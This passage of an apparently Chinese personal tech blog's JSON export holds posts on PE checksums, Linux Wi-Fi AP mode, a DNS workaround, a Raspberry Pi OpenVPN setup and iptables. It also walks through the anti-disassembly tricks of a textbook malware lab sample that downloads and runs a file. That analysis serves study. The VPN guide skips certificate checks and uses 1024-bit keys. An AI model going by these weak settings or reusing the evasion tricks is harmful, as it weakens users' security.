MapFileAndCheckSum(L&quot;D:\\\\newupdate.exe&quot;, &amp;HeaderCheckSum, &amp;CheckSum); if (CheckSum == HeaderCheckSum) &#123; MessageBox(NULL, L&quot;相等&quot;, NULL, 0); &#125; &#125; 附PE可选头结构typedef struct _IMAGE_OPTIONAL_HEADER{ &#x2F;&#x2F; &#x2F;&#x2F; Standard fields. &#x2F;&#x2F;+18h WORD Magic; &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）+1Ah BYTE MajorLinkerVersion; &#x2F;&#x2F; 链接程序的主版本号+1Bh BYTE MinorLinkerVersion; &#x2F;&#x2F; 链接程序的次版本号+1Ch DWORD SizeOfCode; &#x2F;&#x2F; 所有含代码的节的总大小+20h DWORD SizeOfInitializedData; &#x2F;&#x2F; 所有含已初始化数据的节的总大小+24h DWORD SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小+28h DWORD AddressOfEntryPoint; &#x2F;&#x2F; 程序执行入口RVA+2Ch DWORD BaseOfCode; &#x2F;&#x2F; 代码的区块的起始RVA+30h DWORD BaseOfData; &#x2F;&#x2F; 数据的区块的起始RVA &#x2F;&#x2F; &#x2F;&#x2F; NT additional fields. 以下是属于NT结构增加的领域。 &#x2F;&#x2F;+34h DWORD ImageBase; &#x2F;&#x2F; 程序的首选装载地址+38h DWORD SectionAlignment; &#x2F;&#x2F; 内存中的区块的对齐大小+3Ch DWORD FileAlignment; &#x2F;&#x2F; 文件中的区块的对齐大小+40h WORD MajorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的主版本号+42h WORD MinorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的副版本号+44h WORD MajorImageVersion; &#x2F;&#x2F; 可运行于操作系统的主版本号+46h WORD MinorImageVersion; &#x2F;&#x2F; 可运行于操作系统的次版本号+48h WORD MajorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的主版本号+4Ah WORD MinorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的次版本号+4Ch DWORD Win32VersionValue; &#x2F;&#x2F; 莫须有字段，不被病毒利用的话一般为0+50h DWORD SizeOfImage; &#x2F;&#x2F; 映像装入内存后的总尺寸+54h DWORD SizeOfHeaders; &#x2F;&#x2F; 所有头 + 区块表的尺寸大小+58h DWORD CheckSum; &#x2F;&#x2F; 映像的校检和+5Ch WORD Subsystem; &#x2F;&#x2F; 可执行文件期望的子系统+5Eh WORD DllCharacteristics; &#x2F;&#x2F; DllMain()函数何时被调用，默认为 0+60h DWORD SizeOfStackReserve; &#x2F;&#x2F; 初始化时的栈大小+64h DWORD SizeOfStackCommit; &#x2F;&#x2F; 初始化时实际提交的栈大小+68h DWORD SizeOfHeapReserve; &#x2F;&#x2F; 初始化时保留的堆大小+6Ch DWORD SizeOfHeapCommit; &#x2F;&#x2F; 初始化时实际提交的堆大小+70h DWORD LoaderFlags; &#x2F;&#x2F; 与调试有关，默认为 0+74h DWORD NumberOfRvaAndSizes; &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来 &#x2F;&#x2F; 一直是16+78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; &#x2F;&#x2F; 数据目录表} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"linux usb wifi设置AP 模式","slug":"杂学/linux usb wifi设置AP 模式 ","date":"2017-12-11T16:00:00.000Z","updated":"2023-07-27T14:35:36.271Z","comments":true,"path":"2017/12/12/杂学/linux usb wifi设置AP 模式 /","link":"","permalink":"http://zwjsfdbb.top/2017/12/12/%E6%9D%82%E5%AD%A6/linux%20usb%20wifi%E8%AE%BE%E7%BD%AEAP%20%E6%A8%A1%E5%BC%8F%20/","excerpt":"一.问题阐述 本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。 二.解决办法 第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。 第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下： 1.卸载已有的hostapd sudo apt-get autoremove hostapd 2.下载带有rtl8188eu的源码。 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz tar -zxvf v2.0.tar.gz 3.编译 cd RTL8188-hostapd-2.0/hostapd sudo make 4.安装 sudo make install 此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。 在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。 参考链接： https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pi http://os.51cto.com/art/201311/415573.htm","text":"一.问题阐述 本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。 二.解决办法 第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。 第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下： 1.卸载已有的hostapd sudo apt-get autoremove hostapd 2.下载带有rtl8188eu的源码。 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz tar -zxvf v2.0.tar.gz 3.编译 cd RTL8188-hostapd-2.0/hostapd sudo make 4.安装 sudo make install 此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。 在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。 参考链接： https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pi http://os.51cto.com/art/201311/415573.htm","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"WIN10 linux 子系统安装lamp","slug":"Web渗透/WIN10 linux 子系统安装lamp ","date":"2017-11-28T16:00:00.000Z","updated":"2024-03-12T10:15:06.668Z","comments":true,"path":"2017/11/29/Web渗透/WIN10 linux 子系统安装lamp /","link":"","permalink":"http://zwjsfdbb.top/2017/11/29/Web%E6%B8%97%E9%80%8F/WIN10%20linux%20%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85lamp%20/","excerpt":"1.换源 备份原先的源 cp /etc/apt/sources.list /etc/apt/sources.list.bak vim /etc/apt/sources.list 换成 deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 更新 apt-get update 2.安装apache2 apt-get install apache2 service apache2 restart 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面 3.安装php 按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子 我找的解决办法是如下： apt-get install software-properties-common add-apt-repository ppa:ondrej/php apt-get update apt-get install php apt-get install libapache2-mod-php service apache2 restart 4.测试php 在/var/www/html目录下新建test.php 内容如下： &lt;?php phpinfo(); ?&gt; 打开localhost/test.php 正常显示则代表成功 5.至于mysql 的安装，后续再写 ​","text":"1.换源 备份原先的源 cp /etc/apt/sources.list /etc/apt/sources.list.bak vim /etc/apt/sources.list 换成 deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 更新 apt-get update 2.安装apache2 apt-get install apache2 service apache2 restart 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面 3.安装php 按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子 我找的解决办法是如下： apt-get install software-properties-common add-apt-repository ppa:ondrej/php apt-get update apt-get install php apt-get install libapache2-mod-php service apache2 restart 4.测试php 在/var/www/html目录下新建test.php 内容如下： &lt;?php phpinfo(); ?&gt; 打开localhost/test.php 正常显示则代表成功 5.至于mysql 的安装，后续再写 ​","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"dns污染的解决","slug":"杂学/dns污染的解决","date":"2017-11-14T16:00:00.000Z","updated":"2024-03-12T10:08:18.776Z","comments":true,"path":"2017/11/15/杂学/dns污染的解决/","link":"","permalink":"http://zwjsfdbb.top/2017/11/15/%E6%9D%82%E5%AD%A6/dns%E6%B1%A1%E6%9F%93%E7%9A%84%E8%A7%A3%E5%86%B3/","excerpt":"dnsmasq+chinadns+hev-dns-forwarder 1.安装dnsmasq sudo apt-get install dnsmasq 编辑/etc/dnsmasq.conf 取消no-resolv前面的注释 server=127.0.0.1#5354 2.安装chindns https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz 解压 tar -zxf chinadns-1.3.2.tar.gz cd chinadns-1.3.2 .&#x2F;configure make make install 安装结束后在复制到&#x2F;usr&#x2F;local&#x2F;bin 目录中去（可能已经自动复制到了，确认一下） 运行命令为 chinadns -c &#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;chinadns-1.3.2&#x2F;chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 3.安装 git clone https://github.com/aa65535/hev-dns-forwarder cd hev-dns-forwarder make 编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下 运行命令 hev-dns-forwarder 4.加入开机启动项 在/etc/rc.local中加入 sudo hev-dns-forwarder &amp; &gt; /dev/null 2&gt;&amp;1 sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; /dev/null 2&gt;&amp;1 参考链接：https://blog.bluerain.io/p/SS-Redir-For-Router.html ​","text":"dnsmasq+chinadns+hev-dns-forwarder 1.安装dnsmasq sudo apt-get install dnsmasq 编辑/etc/dnsmasq.conf 取消no-resolv前面的注释 server=127.0.0.1#5354 2.安装chindns https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz 解压 tar -zxf chinadns-1.3.2.tar.gz cd chinadns-1.3.2 .&#x2F;configure make make install 安装结束后在复制到&#x2F;usr&#x2F;local&#x2F;bin 目录中去（可能已经自动复制到了，确认一下） 运行命令为 chinadns -c &#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;chinadns-1.3.2&#x2F;chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 3.安装 git clone https://github.com/aa65535/hev-dns-forwarder cd hev-dns-forwarder make 编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下 运行命令 hev-dns-forwarder 4.加入开机启动项 在/etc/rc.local中加入 sudo hev-dns-forwarder &amp; &gt; /dev/null 2&gt;&amp;1 sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; /dev/null 2&gt;&amp;1 参考链接：https://blog.bluerain.io/p/SS-Redir-For-Router.html ​","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"树莓派搭建vpn服务器","slug":"杂学/树莓派搭建vpn服务器","date":"2017-11-10T16:00:00.000Z","updated":"2024-03-12T10:06:10.121Z","comments":true,"path":"2017/11/11/杂学/树莓派搭建vpn服务器/","link":"","permalink":"http://zwjsfdbb.top/2017/11/11/%E6%9D%82%E5%AD%A6/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"1.此篇是在前篇搭建树莓派透明代理的基础上完成的， 2.树莓派尽量设置成静态ip，具体如下 sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.安装openvpn sudo apt-get install openvpn 4.下载easy-rsa cd /etc/openvpn wget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgz tar -xzvf EasyRSA-2.2.2.tgz mv EasyRSA-2.2.2 easy-rsa 5.配置easy-rsa cd /etc/openvpn/easy-rsa vim vars # 打开easy-rsa配置文件 修改一下内容 export EASY_RSA=&quot;/etc/openvpn/easy-rsa&quot; export KEY_SIZE=1024 #默认的2048太大，要运算很久 加载配置 source ./vars 6.生成ca密钥","text":"1.此篇是在前篇搭建树莓派透明代理的基础上完成的， 2.树莓派尽量设置成静态ip，具体如下 sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.安装openvpn sudo apt-get install openvpn 4.下载easy-rsa cd /etc/openvpn wget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgz tar -xzvf EasyRSA-2.2.2.tgz mv EasyRSA-2.2.2 easy-rsa 5.配置easy-rsa cd /etc/openvpn/easy-rsa vim vars # 打开easy-rsa配置文件 修改一下内容 export EASY_RSA=&quot;/etc/openvpn/easy-rsa&quot; export KEY_SIZE=1024 #默认的2048太大，要运算很久 加载配置 source ./vars 6.生成ca密钥 ./clean-all # 先清空所有密钥 ./build-ca # 创建自己的证书 所有内容直接回车就可以了。这时keys文件夹下会多了ca.crt,和ca.key文件 7.生成服务器密钥 ./build-key-server servername # servername为你自己设置的服务器名字 会出现很多让填写的地方，注意下面三个其他的默认就好 Common Name 常用名必须是你方才所设置的服务器名，默认设置如此。 A challenge password? 网上说必须留空，我也照办了，不晓得为什么 Sign the certificate? [y/n] 必须填y 8.生成客户端密钥 ./build-key-pass client1 # 命令中client1是客户端的名字 Enter PEM pass phrase 这个要记住，这是客户端使用vpn时的密码，会让输入两次。 这时keys下又会多出三个文件client1.csr client1.crt client.key 9.生成dh ./build-dh 到此密钥生成部分就完成了。 10.openvpn 服务器配置 # 复制一个模板过来先 cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/server.conf vim /etc/openvpn/server.conf 下面是我的配置 port 1194 #Openvpn服务使用的端口 proto tcp #使用udp协议传输 dev tun #使用隧道 ca /etc/openvpn/easy-rsa/keys/ca.crt #ca公钥路径 cert /etc/openvpn/easy-rsa/keys/server.crt #服务器公钥路径 key /etc/openvpn/easy-rsa/keys/server.key #服务器私钥路径 dh /etc/openvpn/easy-rsa/keys/dh1024.pem #dh server 10.10.20.0 255.255.255.0 #客户端连接后，所在的子网段 ifconfig-pool-persist ipp.txt #客户端使用固定的子网地址，这里可以不配置 push &quot;redirect-gateway def1 bypass-dhcp&quot; #网关重定向，客户端的流量都会经由OpenvpnServer #配置DNS push &quot;dhcp-option DNS 202.141.162.123&quot; push &quot;dhcp-option DNS 202.38.93.153 client-to-client duplicate-cn #允许客户端的CommonName重复，因为我们填的都是默认值 keepalive 10 120 comp-lzo #启动数据压缩 user nobody #Openvpn进程运行时所属的用户，这里为了安全 group nogroup #Openvpn进程运行时所属的组，这里为了安全 persist-key #一直保存key，避免权限问题导致不能再次读取 persist-tun #一直保持隧道，原因同上 status /etc/openvpn/easy-rsa/keys/openvpn-status.log #Openvpn运行状态Log，就在Openvpn目录下，会自动生成 log openvpn.log #Openvpn运行Log，也在Openvpn目录下，会自动生成 verb 3 #log的等级 11.此时可以测试一下了 openvpn server.conf service openvpn restart 不报错就是成功了 12.客户端配置 cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/clientconfig/client.conf vim /etc/openvpn/clientconfig/client.conf 我的配置如下： # 里面注释也很详细，这里贴出我精简后的结果 client #标明是客户端配置 dev tun #使用隧道 proto tcp #使用UDP remote 192.168.19.149 1194 #树莓派外网IP（使用动态域名绑定） + 端口 comp-lzo ca ca.crt #ca公钥 cert wxlnb.crt #客户端公钥 key wxlnb.key #客户端私钥 verb 3 #log等级 13.防火墙规则我就改了一点 iptables -t nat -A PREROUTING -i tun0 -p tcp -j REDSOCKS 14.测试 在其他Windows机器上，下载openvpn 安装，然后把ca.crt,client.conf（就是刚刚那个client.conf）,client1.crt,client1.key复制到config 文件夹下。 参考链接 1.http://www.smartmcu.com/article-246-1.html 2.http://blog.csdn.net/wxlguitar/article/details/51175872","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"重装系统后hexo 博客恢复","slug":"杂学/hexo 博客恢复","date":"2017-11-04T16:00:00.000Z","updated":"2024-03-12T10:08:26.546Z","comments":true,"path":"2017/11/05/杂学/hexo 博客恢复/","link":"","permalink":"http://zwjsfdbb.top/2017/11/05/%E6%9D%82%E5%AD%A6/hexo%20%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/","excerpt":"1.安装node.js和git 这个不用多说，直接下载安装就行了。 2.配置 git 个人信息，生成新的 ssh 密钥：git config –global user.name “xxxxxx”git config –global user.email “xxxxxx”ssh-keygen -t rsa -C “xxxxxxxx(邮箱)” 3.添加公钥在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。 4.安装hexo建议先npm install cnpm -g –registry&#x3D;https://registry.npm.taobao.org安装的时候 用cpm 代替npm这样的话npm 安装比较快而且不容易失败cnpm install hexo-cli -g 5.删除博客文件夹文件，保留部分打开原来的博客文件夹,只需保留_config.yml，theme&#x2F;，source&#x2F;，scaffolds&#x2F;，package.json，.gitignore 这些项目，删除其他的文件。","text":"1.安装node.js和git 这个不用多说，直接下载安装就行了。 2.配置 git 个人信息，生成新的 ssh 密钥：git config –global user.name “xxxxxx”git config –global user.email “xxxxxx”ssh-keygen -t rsa -C “xxxxxxxx(邮箱)” 3.添加公钥在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。 4.安装hexo建议先npm install cnpm -g –registry&#x3D;https://registry.npm.taobao.org安装的时候 用cpm 代替npm这样的话npm 安装比较快而且不容易失败cnpm install hexo-cli -g 5.删除博客文件夹文件，保留部分打开原来的博客文件夹,只需保留_config.yml，theme&#x2F;，source&#x2F;，scaffolds&#x2F;，package.json，.gitignore 这些项目，删除其他的文件。 6.git bush在本文件夹下git bush,运行cnpm install 7.安装部署插件npm install hexo-deployer-git –save 8.测试此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"对抗反汇编2","slug":"逆向/对抗反汇编分析","date":"2017-10-21T16:00:00.000Z","updated":"2024-03-12T09:45:40.610Z","comments":true,"path":"2017/10/22/逆向/对抗反汇编分析/","link":"","permalink":"http://zwjsfdbb.top/2017/10/22/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/","excerpt":"一、 样本基本信息 样本来源：恶意代码实战中的Lab15-03.exe。 二、分析过程 IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。 由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图 继续往下看，发现有一个除零异常出现 ， 显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图","text":"一、 样本基本信息 样本来源：恶意代码实战中的Lab15-03.exe。 二、分析过程 IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。 由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图 继续往下看，发现有一个除零异常出现 ， 显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图 这个估计就是恶意代码真正要做的事情的代码了。继续向下看，有个URLDownloadToFileA函数，显然很恶意。下面还有个反汇编异常先处理了，先D后C，然后结果如下， 到此整个代码就分析完了，主要是4014c0处是真正要关注的，下面分析这个位置的代码 主要关注标红的位置，此处看不出什么来，在OD中实际执行一下来看。 直接在0x40148c处下断点，然后直接f9运行到此处，若看到一堆数据，右键分析-&gt;从模块中删除分析就可以了，改写相应位置的异常按照IDA那样，实验过程发现se处理程序的确是0x4014c0但是程序并没有跳到那个位置而是终止了，没搞明白，为了真正看到0x4014c0处的具体执行情况。我选择直接编辑汇编代码。写入jmp 0x4014c0, 发现在0x4014db处好像也是异常终止了，后改为 正常了、然后在四个函数处下断点观察参数信息和返回信息， 0x401534明显是一个解密函数，然后把网址和文件就解密出来，然后URLDownloadToFileA下载，winexec 执行下载的文件。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"iptables 基础","slug":"系统基础/iptables","date":"2017-10-19T16:00:00.000Z","updated":"2024-03-12T09:53:32.919Z","comments":true,"path":"2017/10/20/系统基础/iptables/","link":"","permalink":"http://zwjsfdbb.top/2017/10/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/iptables/","excerpt":"简介&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。 &amp;emsp;&amp;emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。 &amp;emsp;&amp;emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter 常用操作&amp;emsp常用操作命令 说明 -A 在指定链尾部添加规则 -D 删除匹配的规则","text":"简介&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。 &amp;emsp;&amp;emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。 &amp;emsp;&amp;emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter 常用操作&amp;emsp常用操作命令 说明 -A 在指定链尾部添加规则 -D 删除匹配的规则 -R 替换匹配的规则 -I 在指定位置插入规则 例：iptables -I INPUT 1 --dport 80 -j ACCEPT （将规则插入到filter表INPUT链中的第一位上） -L&#x2F;S 列出指定链或所有链的规则 -F 删除指定链或所有链的规则 -N 创建用户自定义链 例：iptables -N allowed -X 删除指定的用户自定义链 -P 为指定链设置默认规则策略，对自定义链不起作用 例：iptables -P OUTPUT DROP -Z 将指定链或所有链的计数器清零 -E 更改自定义链的名称 例：iptables -E allowed disallowed -n ip地址和端口号以数字方式显示 例：iptables -Ln 常见规则匹配器 说明 -p tcp|udp|icmp|all 匹配协议，all会匹配所有协议 -s addr[&#x2F;mask] 匹配源地址 -d addr[&#x2F;mask] 匹配目标地址 –sport port1[:port2] 匹配源端口(可指定连续的端口） –dport port1[:port2] 匹配目的端口(可指定连续的端口） -o interface 匹配出口网卡，只适用FORWARD、POSTROUTING、OUTPUT。 例：iptables -A FORWARD -o eth0 -i interface 匹配入口网卡，只使用PREROUTING、INPUT、FORWARD。 –icmp-type 匹配icmp类型（使用iptables -p icmp -h可查看可用的ICMP类型） –tcp-flags mask comp 匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记。 例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN，ACK -j ACCEPT （表示匹配SYN和ACK标记的数据包） 目标动作 说明 ACCEPT 允许数据包通过 DROP 丢弃数据包 REJECT 丢弃数据包，并且将拒绝信息发送给发送方 SNAT 源地址转换（在nat表上） 例：iptables -t nat -A POSTROUTING -d 192.168.0.102 -j SNAT --to 192.168.0.1 DNAT 目标地址转换（在nat表上） 例：iptables -t nat -A PREROUTING -d 202.202.202.2 -j DNAT --to-destination 192.168.0.102 REDIRECT 目标端口转换（在nat表上） 例：iptables -t nat -D PREROUTING -p tcp --dport 8080 -i eth2.2 -j REDIRECT --to 80 MARK 将数据包打上标记 例：iptables -t mangle -A PREROUTING -s 192.168.1.3 -j MARK --set-mark 60 注意要点： 1、目标地址转换一般在PREROUTING链上操作 2、源地址转换一般在POSTROUTING链上操作 state：匹配指定的状态数据包 参数 说明 –state value value可以为NEW、RELATED（有关联的）、ESTABLISHED、INVALID（未知连接） 例子： iptables -A INPUT -m state –state NEW，ESTABLISHED -j ACCEPT 常见iptables&amp;emsp;&amp;emsp;MASQUERADE：是动态分配ip时用的IP伪装：在nat表的POSTROUTING链加入一条规则:所有从ppp0口送出的包会被伪装（MASQUERADE） iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE &amp;emsp;&amp;emsp;REDIRECT：重定向，这个在squid透明代理时肯定要用到它 所有从eth1进入的请求80和82端口的数据，被转发到80端口，由squid处理。 iptables -t nat -A PREROUTING - -i eth1 -p tcp 